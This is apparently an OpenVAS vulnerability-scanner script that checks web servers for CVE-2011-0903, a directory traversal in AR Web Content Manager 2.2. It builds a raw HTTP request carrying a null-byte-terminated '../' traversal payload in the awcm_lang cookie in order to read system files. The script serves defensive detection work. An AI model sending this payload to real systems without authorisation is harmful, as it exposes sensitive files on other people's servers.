if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902338" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-02-23 12:24:37 +0100 (Wed, 23 Feb 2011)" );
	script_cve_id( "CVE-2011-0903" );
	script_bugtraq_id( 46017 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "AR Web Content Manager Multiple Directory Traversal Vulnerabilities" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/64980" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/16049/" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "insight", value: "The flaw exists due to an error in 'index.php' and 'header.php'
  scripts, which allows to read arbitrary files via a .. (dot dot) in the
  'awcm_theme' or 'awcm_lang' cookies." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running AR Web Content Manager and is prone
  multiple Directory Traversal vulnerabilities." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to obtain
  potentially sensitive information and execute arbitrary local scripts in the
  context of the web server process." );
	script_tag( name: "affected", value: "AR Web Content Manager (AWCM) version 2.2." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
useragent = http_get_user_agent();
files = traversal_files();
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/awcm", "/AWCM", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/index.php", port: port );
	if(ContainsString( res, ">AWCM" )){
		for pattern in keys( files ) {
			file = files[pattern];
			exp = "../../../../../../../../../../" + file + "%00";
			url = NASLString( dir + "/index.php" );
			req2 = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Cookie: awcm_lang=", exp, "\\r\\n\\r\\n" );
			res2 = http_keepalive_send_recv( port: port, data: req2 );
			if(egrep( string: res2, pattern: pattern )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

